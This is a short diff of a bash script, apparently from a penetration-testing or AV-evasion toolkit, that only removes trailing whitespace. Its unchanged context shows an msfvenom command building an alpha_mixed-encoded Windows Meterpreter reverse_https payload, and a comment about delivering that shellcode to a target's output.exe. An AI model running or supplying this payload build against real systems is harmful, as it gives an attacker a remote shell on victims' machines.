@@ -1,8 +1,8 @@
-#!/bin/bash          
+#!/bin/bash
 
 
 #DESCRIPTION_START
-# Call the generated output.exe on target, 
+# Call the generated output.exe on target,
 # delivering the shellcode string in output/alpha_mixed.txt as command line argument
 #DESCRIPTION_END
 
@@ -34,7 +34,7 @@ enable_debug_print
 #CONFIGURATION_END
 
 
-# make meterpreter reverse payload, encoded with msf alpha_mixed 
+# make meterpreter reverse payload, encoded with msf alpha_mixed
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > output/sc_alpha_mixed.txt
 
 # set shellcode source
